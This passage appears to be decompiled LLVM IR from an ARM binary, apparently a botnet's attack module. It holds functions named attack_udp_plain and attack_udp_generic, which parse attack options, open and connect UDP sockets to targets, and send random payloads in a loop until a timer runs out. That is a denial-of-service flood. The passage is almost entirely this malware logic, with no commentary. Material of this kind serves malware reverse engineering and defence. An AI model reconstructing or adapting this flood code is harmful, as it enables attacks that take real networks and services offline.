  %v0_aba0 = call i32 @rand_next()
  %v1_aba0 = trunc i32 %v0_aba0 to i16
  store i32 %v0_aba0, i32* %r0.global-to-local, align 4
  %v3_aba4 = load i32, i32* @r6, align 4
  %v4_aba4 = add i32 %v3_aba4, 18
  %v5_aba4 = inttoptr i32 %v4_aba4 to i16*
  store i16 %v1_aba0, i16* %v5_aba4, align 2
  br label %dec_label_pc_aa20

dec_label_pc_abac:                                ; preds = %dec_label_pc_aa20, %dec_label_pc_a9b0
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_abb0 = call i32 @__GI_time(i32* null)
  store i32 %v2_abb0, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r3.global-to-local, align 4
  %v9_abb8 = icmp eq i32 %v2_a6d4, %v2_abb0
  store i1 %v9_abb8, i1* %cpsr_z.global-to-local, align 1
  %v6_abbc = icmp slt i32 %v2_a6d4, %v2_abb0
  br i1 %v6_abbc, label %dec_label_pc_abc0, label %dec_label_pc_abac.dec_label_pc_a9b0_crit_edge

dec_label_pc_abac.dec_label_pc_a9b0_crit_edge:    ; preds = %dec_label_pc_abac
  %v0_a9b4.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_a9b0

dec_label_pc_abc0:                                ; preds = %dec_label_pc_abac, %entry, %dec_label_pc_abcc
  %v1_abc8 = phi i32 [ %v3_a6e8, %entry ], [ %v1_abd0, %dec_label_pc_abcc ], [ %v2_abb0, %dec_label_pc_abac ]
  store i32 %v3_a504, i32* %r4.global-to-local, align 4
  store i32 %v24_a504, i32* %fp.global-to-local, align 4
  store i32 %v27_a504, i32* %lr.global-to-local, align 4
  ret i32 %v1_abc8

dec_label_pc_abcc:                                ; preds = %dec_label_pc_a6f8
  %v0_abcc = load i32, i32* @r8, align 4
  store i32 %v0_abcc, i32* %r0.global-to-local, align 4
  %v1_abd0 = call i32 @__GI___libc_close(i32 %v0_abcc)
  store i32 %v1_abd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_abc0

; uselistorder directives
  uselistorder i32 %v1_abd0, { 1, 0 }
  uselistorder i32 %v0_aba0, { 1, 0 }
  uselistorder i32 %v0_ab68, { 1, 0 }
  uselistorder i32 %v0_ab54, { 1, 0 }
  uselistorder i32 %v0_ab40, { 1, 0 }
  uselistorder i32 %v1_ab34, { 1, 2, 0 }
  uselistorder i32 %v0_aad8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_aa94, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa50, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i1 %v7_a9cc, { 2, 1, 0 }
  uselistorder i32 %v2_a9a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a808, { 1, 2, 0 }
  uselistorder i32 %v1_a7cc, { 2, 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v1_a7c4, { 2, 0, 1 }
  uselistorder i32 %v1_a7c0, { 2, 0, 1 }
  uselistorder i32 %v1_a7bc, { 2, 0, 1 }
  uselistorder i32 %v3_a744, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_a740, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_a734, { 1, 0, 2 }
  uselistorder i1 %v7_a718, { 1, 0 }
  uselistorder i1 %v7_a6ec, { 1, 0 }
  uselistorder i32 %v3_a6e8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_a6d4, { 2, 1, 0 }
  uselistorder i32 %v6_a6c4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v6_a618, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a600, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a58c, { 1, 0 }
  uselistorder i32 %v6_a584, { 1, 0 }
  uselistorder i32 %v7_a56c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 25, 26, 27, 28, 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 41, 42, 43, 44, 52, 45, 46, 47, 48, 49, 50, 51, 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r2.global-to-local, { 35, 36, 37, 43, 38, 39, 40, 41, 42, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 35, 36, 37, 38, 39, 40, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 32, 31, 34, 33, 0 }
  uselistorder i32* %r0.global-to-local, { 38, 37, 40, 39, 42, 43, 41, 44, 46, 47, 45, 48, 50, 49, 51, 53, 52, 54, 55, 56, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 22, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 247, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_abc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aba0, { 1, 0 }
  uselistorder label %dec_label_pc_aa20, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* %stack_var_-80, align 4
  %v2_ac00 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ac0c = load i32, i32* @fp, align 4
  store i32 %v0_ac0c, i32* %r0.global-to-local, align 4
  %v2_ac10 = call i32 @calloc(i32 %v0_ac0c, i32 4)
  store i32 65535, i32* @r6, align 4
  %v0_ac1c = load i32, i32* @r5, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_ac10, i32* @sb, align 4
  %v0_ac2c = load i32, i32* @r4, align 4
  store i32 %v0_ac2c, i32* %r0.global-to-local, align 4
  %v5_ac30 = inttoptr i32 %v0_ac1c to i32*
  %v6_ac30 = call i32 @attack_get_opt_int(i32 %v0_ac2c, i32* %v5_ac30, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_ac34 = load i32, i32* @r5, align 4
  %v0_ac40 = load i32, i32* @r6, align 4
  store i32 %v0_ac40, i32* %r3.global-to-local, align 4
  %v0_ac44 = load i32, i32* @r4, align 4
  store i32 %v0_ac44, i32* %r0.global-to-local, align 4
  %v3_ac48 = urem i32 %v6_ac30, 65536
  store i32 %v3_ac48, i32* @r8, align 4
  %v5_ac4c = inttoptr i32 %v0_ac34 to i32*
  %v6_ac4c = call i32 @attack_get_opt_int(i32 %v0_ac44, i32* %v5_ac4c, i32 6, i32 %v0_ac40, i32 ptrtoint (i32* @0 to i32))
  %v0_ac50 = load i32, i32* @r5, align 4
  %v3_ac54 = mul i32 %v6_ac4c, 65536
  store i32 %v3_ac54, i32* @sl, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ac60 = load i32, i32* @r4, align 4
  store i32 %v0_ac60, i32* %r0.global-to-local, align 4
  %v5_ac64 = inttoptr i32 %v0_ac50 to i32*
  %v6_ac64 = call i32 @attack_get_opt_int(i32 %v0_ac60, i32* %v5_ac64, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ac74 = urem i32 %v6_ac64, 65536
  %v0_ac78 = load i32, i32* @r5, align 4
  %v0_ac7c = load i32, i32* @r4, align 4
  store i32 %v0_ac7c, i32* %r0.global-to-local, align 4
  %v5_ac84 = inttoptr i32 %v0_ac78 to i32*
  %v6_ac84 = call i32 @attack_get_opt_int(i32 %v0_ac7c, i32* %v5_ac84, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ac90 = urem i32 %v6_ac84, 256
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_acac = call i32 @__GI_time(i32* null)
  store i32 %v2_acac, i32* %r0.global-to-local, align 4
  %v0_acb0 = load i32, i32* @sl, align 4
  %v3_acb0 = udiv i32 %v0_acb0, 65536
  %v1_acb4 = load i32, i32* @r6, align 4
  %v9_acb4 = icmp eq i32 %v3_acb0, %v1_acb4
  br i1 %v9_acb4, label %dec_label_pc_ae88, label %bb

bb:                                               ; preds = %entry
  %v4_acbc = udiv i32 %v0_acb0, 16777216
  store i32 %v4_acbc, i32* %r3.global-to-local, align 4
  %v1_acc0 = load i32, i32* @r7, align 4
  %v2_acc0 = add i32 %v1_acc0, %v2_acac
  store i32 %v2_acc0, i32* %r0.global-to-local, align 4
  %v2_acb8 = mul nuw nsw i32 %v3_acb0, 256
  %v5_acc4 = and i32 %v2_acb8, 65280
  %v6_acc4 = or i32 %v5_acc4, %v4_acbc
  br label %dec_label_pc_acd4

dec_label_pc_acd4:                                ; preds = %bb, %dec_label_pc_ae88
  %v0_acc88 = phi i32 [ %v2_acc011, %dec_label_pc_ae88 ], [ %v2_acc0, %bb ]
  %stack_var_-72.1 = phi i32 [ %v3_ae90, %dec_label_pc_ae88 ], [ %v6_acc4, %bb ]
  %v0_acd4 = load i32, i32* @fp, align 4
  %v2_acd4 = icmp eq i32 %v0_acd4, 0
  br i1 %v2_acd4, label %dec_label_pc_ae0c, label %dec_label_pc_acdc

dec_label_pc_acdc:                                ; preds = %dec_label_pc_acd4
  store i32 0, i32* @sl, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v2_ad08 = ptrtoint i32* %stack_var_-56 to i32
  %sext = mul i32 %stack_var_-72.1, 65536
  %v4_ad30 = sdiv i32 %sext, 65536
  br label %dec_label_pc_ad5c

dec_label_pc_acec:                                ; preds = %.thread24, %dec_label_pc_ad98
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_acf8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_acf8, i32* %r0.global-to-local, align 4
  %v7_acfc = icmp eq i32 %v3_acf8, -1
  %v0_ad00 = load i32, i32* @sl, align 4
  %v1_ad00 = add i32 %v0_ad00, 1
  store i32 %v1_ad00, i32* @sl, align 4
  %v0_ad04 = load i32, i32* @r7, align 4
  %v1_ad04 = add i32 %v0_ad04, 24
  store i32 %v1_ad04, i32* @r7, align 4
  %v1_ad10 = load i32, i32* @r6, align 4
  %v2_ad10 = load i32, i32* @sb, align 4
  %v3_ad10 = add i32 %v2_ad10, %v1_ad10
  %v4_ad10 = inttoptr i32 %v3_ad10 to i32*
  store i32 %v3_acf8, i32* %v4_ad10, align 4
  br i1 %v7_acfc, label %dec_label_pc_ae30.loopexit12, label %dec_label_pc_ad18

dec_label_pc_ad18:                                ; preds = %dec_label_pc_acec
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %stack_var_-72.1, i32* %r3.global-to-local, align 4
  %v0_ad30 = load i32, i32* %r0.global-to-local, align 4
  %v6_ad30 = call i32 @bind(i32 %v0_ad30, i32 %v2_ad08, i32 16, i32 %v4_ad30, i32 2)
  store i32 %v6_ad30, i32* %r0.global-to-local, align 4
  %v0_ad34 = load i32, i32* @r5, align 4
  %v1_ad34 = add i32 %v0_ad34, 20
  %v2_ad34 = inttoptr i32 %v1_ad34 to i8*
  %v3_ad34 = load i8, i8* %v2_ad34, align 1
  %v4_ad34 = zext i8 %v3_ad34 to i32
  store i32 %v4_ad34, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_ad34, 32
  br i1 %tmp, label %dec_label_pc_adac, label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad18
  %v0_ad40 = load i32, i32* @r6, align 4
  %v1_ad40 = load i32, i32* @sb, align 4
  %v2_ad40 = add i32 %v1_ad40, %v0_ad40
  %v3_ad40 = inttoptr i32 %v2_ad40 to i32*
  %v4_ad40 = load i32, i32* %v3_ad40, align 4
  store i32 %v4_ad40, i32* %r0.global-to-local, align 4
  %v3_ad4c = call i32 @__libc_connect(i32 %v4_ad40, i32 %v0_ad34, i32 16)
  store i32 %v3_ad4c, i32* %r0.global-to-local, align 4
  %v0_ad50 = load i32, i32* @sl, align 4
  %v1_ad50 = load i32, i32* @fp, align 4
  %v9_ad50 = icmp eq i32 %v0_ad50, %v1_ad50
  %v0_ad54 = load i32, i32* @r6, align 4
  %v1_ad54 = add i32 %v0_ad54, 4
  store i32 %v1_ad54, i32* @r6, align 4
  br i1 %v9_ad50, label %dec_label_pc_ae0c, label %dec_label_pc_ad5c

dec_label_pc_ad5c:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ad40, %dec_label_pc_acdc
  store i32 65535, i32* @r4, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v2_ad6c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v2_ad6c, i32* %r0.global-to-local, align 4
  %v0_ad70 = load i32, i32* @r8, align 4
  %v3_ad74 = udiv i32 %v0_ad70, 256
  %v1_ad70 = mul i32 %v0_ad70, 256
  %v4_ad78 = and i32 %v1_ad70, 65280
  %v5_ad78 = or i32 %v4_ad78, %v3_ad74
  store i32 %v5_ad78, i32* %r3.global-to-local, align 4
  %v2_ad7c = load i32, i32* %stack_var_-80, align 4
  %v1_ad80 = load i32, i32* @r7, align 4
  %v2_ad80 = add i32 %v1_ad80, %v2_ad7c
  store i32 %v2_ad80, i32* @r5, align 4
  %v1_ad88 = load i32, i32* @r4, align 4
  %v9_ad88 = icmp eq i32 %v0_ad70, %v1_ad88
  %v1_ad8c = load i32, i32* @r6, align 4
  %v3_ad8c = add i32 %v1_ad8c, %v2_ac00
  %v4_ad8c = inttoptr i32 %v3_ad8c to i32*
  store i32 %v2_ad6c, i32* %v4_ad8c, align 4
  br i1 %v9_ad88, label %dec_label_pc_ad98, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_ad5c
  %v1_ad9025 = load i32, i32* %r3.global-to-local, align 4
  %v2_ad9026 = trunc i32 %v1_ad9025 to i16
  %v3_ad9027 = load i32, i32* @r5, align 4
  %v4_ad9028 = add i32 %v3_ad9027, 2
  %v5_ad9029 = inttoptr i32 %v4_ad9028 to i16*
  store i16 %v2_ad9026, i16* %v5_ad9029, align 2
  br label %dec_label_pc_acec

dec_label_pc_ad98:                                ; preds = %dec_label_pc_ad5c
  %v0_ad98 = call i32 @rand_next()
  %v1_ad98 = trunc i32 %v0_ad98 to i16
  store i32 %v0_ad98, i32* %r0.global-to-local, align 4
  %v2_ad9c = load i32, i32* %stack_var_-80, align 4
  store i32 %v2_ad9c, i32* %r3.global-to-local, align 4
  %v1_ada0 = load i32, i32* @r7, align 4
  %v2_ada0 = add i32 %v1_ada0, %v2_ad9c
  store i32 %v2_ada0, i32* @r5, align 4
  %v4_ada4 = add i32 %v2_ada0, 2
  %v5_ada4 = inttoptr i32 %v4_ada4 to i16*
  store i16 %v1_ad98, i16* %v5_ada4, align 2
  br label %dec_label_pc_acec

dec_label_pc_adac:                                ; preds = %dec_label_pc_ad18
  %v1_adac = add i32 %v0_ad34, 16
  %v2_adac = inttoptr i32 %v1_adac to i32*
  %v3_adac = load i32, i32* %v2_adac, align 4
  store i32 %v3_adac, i32* @r4, align 4
  %v0_adb0 = call i32 @rand_next()
  store i32 %v0_adb0, i32* %r0.global-to-local, align 4
  %v0_adb4 = load i32, i32* @r4, align 4
  %v1_adc0 = and i32 %v0_adb4, 65280
  store i32 %v1_adc0, i32* %r3.global-to-local, align 4
  %v0_adc4 = load i32, i32* @r5, align 4
  %v1_adc4 = add i32 %v0_adc4, 20
  %v2_adc4 = inttoptr i32 %v1_adc4 to i8*
  %v3_adc4 = load i8, i8* %v2_adc4, align 1
  %v4_adc4 = zext i8 %v3_adc4 to i32
  %v5_adcc = call i32 @llvm.bswap.i32(i32 %v0_adb4)
  %v7_add0 = lshr i32 %v0_adb0, %v4_adc4
  %v8_add0 = add i32 %v7_add0, %v5_adcc
  %v1_add4 = and i32 %v8_add0, 16711680
  store i32 %v1_add4, i32* %r0.global-to-local, align 4
  %v5_ade8 = call i32 @llvm.bswap.i32(i32 %v8_add0)
  store i32 %v5_ade8, i32* %r3.global-to-local, align 4
  %v2_adec = add i32 %v0_adc4, 4
  %v3_adec = inttoptr i32 %v2_adec to i32*
  store i32 %v5_ade8, i32* %v3_adec, align 4
  %v0_adf0 = load i32, i32* @r5, align 4
  %v0_adf4 = load i32, i32* @r6, align 4
  %v1_adf4 = load i32, i32* @sb, align 4
  %v2_adf4 = add i32 %v1_adf4, %v0_adf4
  %v3_adf4 = inttoptr i32 %v2_adf4 to i32*
  %v4_adf4 = load i32, i32* %v3_adf4, align 4
  store i32 %v4_adf4, i32* %r0.global-to-local, align 4
  %v3_adfc = call i32 @__libc_connect(i32 %v4_adf4, i32 %v0_adf0, i32 16)
  store i32 %v3_adfc, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* @sl, align 4
  %v1_ae00 = load i32, i32* @fp, align 4
  %v9_ae00 = icmp eq i32 %v0_ae00, %v1_ae00
  %v0_ae04 = load i32, i32* @r6, align 4
  %v1_ae04 = add i32 %v0_ae04, 4
  store i32 %v1_ae04, i32* @r6, align 4
  br i1 %v9_ae00, label %dec_label_pc_ae0c, label %dec_label_pc_ad5c

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ad40, %dec_label_pc_acd4
  %v1_ae1019 = phi i32 [ 0, %dec_label_pc_acd4 ], [ %v0_ae00, %dec_label_pc_adac ], [ %v0_ad50, %dec_label_pc_ad40 ]
  store i32 0, i32* @r5, align 4
  %v2_ae44 = icmp eq i32 %v1_ac90, 0
  br label %dec_label_pc_ae10

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae10.backedge, %dec_label_pc_ae0c
  %v1_ae10 = phi i32 [ %v1_ae10.pre, %dec_label_pc_ae10.backedge ], [ %v1_ae1019, %dec_label_pc_ae0c ]
  %v1_ae48 = phi i32 [ %v0_ae1017, %dec_label_pc_ae10.backedge ], [ 0, %dec_label_pc_ae0c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v5_ae18 = icmp slt i32 %v1_ae48, %v1_ae10
  br i1 %v5_ae18, label %dec_label_pc_ae3c, label %dec_label_pc_ae1c

dec_label_pc_ae1c:                                ; preds = %dec_label_pc_ae10
  %v2_ae1c = call i32 @__GI_time(i32* null)
  store i32 %v2_ae1c, i32* %r0.global-to-local, align 4
  store i32 %v0_acc88, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v6_ae2c = icmp slt i32 %v0_acc88, %v2_ae1c
  br i1 %v6_ae2c, label %dec_label_pc_ae30, label %dec_label_pc_ae10.backedge

dec_label_pc_ae30.loopexit12:                     ; preds = %dec_label_pc_acec
  %v1_ae38.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %dec_label_pc_ae1c, %dec_label_pc_ae30.loopexit12
  %v1_ae38 = phi i32 [ %v1_ae38.pre, %dec_label_pc_ae30.loopexit12 ], [ %v2_ae1c, %dec_label_pc_ae1c ]
  ret i32 %v1_ae38

dec_label_pc_ae3c:                                ; preds = %dec_label_pc_ae10
  store i32 %v2_ac00, i32* %r3.global-to-local, align 4
  %v4_ae48 = mul i32 %v1_ae48, 4
  %v5_ae48 = add i32 %v4_ae48, %v2_ac00
  %v6_ae48 = inttoptr i32 %v5_ae48 to i32*
  %v7_ae48 = load i32, i32* %v6_ae48, align 4
  store i32 %v7_ae48, i32* @r4, align 4
  br i1 %v2_ae44, label %dec_label_pc_ae50, label %dec_label_pc_ae6c

dec_label_pc_ae50:                                ; preds = %dec_label_pc_ae3c, %dec_label_pc_ae6c
  %v0_ae54 = phi i32 [ %v7_ae48, %dec_label_pc_ae3c ], [ %v0_ae54.pre, %dec_label_pc_ae6c ]
  %v1_ae50 = phi i32 [ %v1_ae48, %dec_label_pc_ae3c ], [ %v1_ae50.pre, %dec_label_pc_ae6c ]
  %v0_ae50 = load i32, i32* @sb, align 4
  %v4_ae50 = mul i32 %v1_ae50, 4
  %v5_ae50 = add i32 %v4_ae50, %v0_ae50
  %v6_ae50 = inttoptr i32 %v5_ae50 to i32*
  %v7_ae50 = load i32, i32* %v6_ae50, align 4
  store i32 %v7_ae50, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ae60 = call i32 @__libc_send(i32 %v7_ae50, i32 %v0_ae54, i32 %v3_ac74, i32 16384)
  store i32 %v4_ae60, i32* %r0.global-to-local, align 4
  %v0_ae64 = load i32, i32* @r5, align 4
  %v1_ae64 = add i32 %v0_ae64, 1
  store i32 %v1_ae64, i32* @r5, align 4
  br label %dec_label_pc_ae10.backedge

dec_label_pc_ae10.backedge:                       ; preds = %dec_label_pc_ae50, %dec_label_pc_ae1c
  %v0_ae1017 = phi i32 [ %v1_ae64, %dec_label_pc_ae50 ], [ 0, %dec_label_pc_ae1c ]
  %v1_ae10.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_ae10

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae3c
  store i32 %v7_ae48, i32* %r0.global-to-local, align 4
  %v2_ae74 = call i32 @rand_alphastr(i32 %v7_ae48, i32 %v3_ac74)
  store i32 %v2_ae74, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ae80 = load i32, i32* @r4, align 4
  %v4_ae80 = add i32 %v3_ae80, %v3_ac74
  %v5_ae80 = inttoptr i32 %v4_ae80 to i8*
  store i8 0, i8* %v5_ae80, align 1
  %v1_ae50.pre = load i32, i32* @r5, align 4
  %v0_ae54.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ae50

dec_label_pc_ae88:                                ; preds = %entry
  %v1_acc010 = load i32, i32* @r7, align 4
  %v2_acc011 = add i32 %v1_acc010, %v2_acac
  store i32 %v2_acc011, i32* %r0.global-to-local, align 4
  %v0_ae88 = call i32 @rand_next()
  %v3_ae90 = urem i32 %v0_ae88, 65536
  store i32 %v3_ae90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_acd4

; uselistorder directives
  uselistorder i32 %v2_acc011, { 1, 0 }
  uselistorder i32 %v7_ae48, { 2, 1, 0, 3 }
  uselistorder i32 %v5_ade8, { 1, 0 }
  uselistorder i32 %v0_ad98, { 1, 0 }
  uselistorder i32 %v0_ad70, { 2, 0, 1 }
  uselistorder i32 %v3_acf8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-72.1, { 1, 0 }
  uselistorder i32 %v0_acc88, { 1, 0 }
  uselistorder i32 %v4_acbc, { 1, 0 }
  uselistorder i32 %v3_ac74, { 2, 1, 0 }
  uselistorder i32 %v2_ac00, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 14, 13, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 13, 3, 2, 5, 4, 19, 7, 6, 10, 8, 9, 11, 12, 23, 21, 15, 14, 16, 18, 20, 17, 22, 25, 24, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ae50, { 1, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_acec, { 1, 0 }
  uselistorder label %dec_label_pc_acd4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ae9c = load i32, i32* @lr, align 4
  store i32 0, i32* @r8, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_aec8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_aecc = load i32, i32* @r4, align 4
  store i32 %v0_aecc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_aed8 = load i32, i32* @r8, align 4
  store i32 %v0_aed8, i32* %r3.global-to-local, align 4
  %v0_aedc = load i32, i32* @r5, align 4
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  %v5_aee0 = inttoptr i32 %v0_aecc to i32*
  %v6_aee0 = call i32 @attack_get_opt_int(i32 %v0_aedc, i32* %v5_aee0, i32 2, i32 %v0_aed8, i32 %v2_aec8)
  %v1_aeec = urem i32 %v6_aee0, 256
  store i32 %v1_aeec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_aef8 = load i32, i32* @r4, align 4
  store i32 %v0_aef8, i32* %r1.global-to-local, align 4
  %v0_aefc = load i32, i32* @r5, align 4
  store i32 %v0_aefc, i32* %r0.global-to-local, align 4
  %v5_af00 = trunc i32 %v6_aee0 to i8
  %v6_af04 = inttoptr i32 %v0_aef8 to i32*
  %v7_af04 = call i32 @attack_get_opt_int(i32 %v0_aefc, i32* %v6_af04, i32 3, i32 65535, i32 %v6_aee0)
  %v0_af08 = load i32, i32* @r4, align 4
  store i32 %v0_af08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_af18 = load i32, i32* @r5, align 4
  store i32 %v0_af18, i32* %r0.global-to-local, align 4
  %v5_af1c = inttoptr i32 %v0_af08 to i32*
  %v6_af1c = call i32 @attack_get_opt_int(i32 %v0_af18, i32* %v5_af1c, i32 4, i32 64, i32 %v7_af04)
  %v1_af24 = urem i32 %v6_af1c, 256
  store i32 %v1_af24, i32* %ip.global-to-local, align 4
  %v0_af28 = load i32, i32* @r4, align 4
  store i32 %v0_af28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_af30 = load i32, i32* @r8, align 4
  store i32 %v0_af30, i32* %r3.global-to-local, align 4
  %v0_af34 = load i32, i32* @r5, align 4
  store i32 %v0_af34, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_af1c, 16777216
  %v5_af3c = sdiv i32 %sext, 16777216
  %v6_af3c = inttoptr i32 %v0_af28 to i32*
  %v7_af3c = call i32 @attack_get_opt_int(i32 %v0_af34, i32* %v6_af3c, i32 5, i32 %v0_af30, i32 %v5_af3c)
  %v1_af48 = urem i32 %v7_af3c, 256
  store i32 %v1_af48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_af54 = load i32, i32* @r4, align 4
  store i32 %v0_af54, i32* %r1.global-to-local, align 4
  %v0_af58 = load i32, i32* @r5, align 4
  store i32 %v0_af58, i32* %r0.global-to-local, align 4
  %v5_af60 = inttoptr i32 %v0_af54 to i32*
  %v6_af60 = call i32 @attack_get_opt_int(i32 %v0_af58, i32* %v5_af60, i32 6, i32 65535, i32 %v1_af48)
  %v0_af6c = load i32, i32* @r4, align 4
  store i32 %v0_af6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_af78 = load i32, i32* @r5, align 4
  store i32 %v0_af78, i32* %r0.global-to-local, align 4
  %v5_af7c = inttoptr i32 %v0_af6c to i32*
  %v6_af7c = call i32 @attack_get_opt_int(i32 %v0_af78, i32* %v5_af7c, i32 7, i32 65535, i32 %v6_af60)
  %v0_af80 = load i32, i32* @r4, align 4
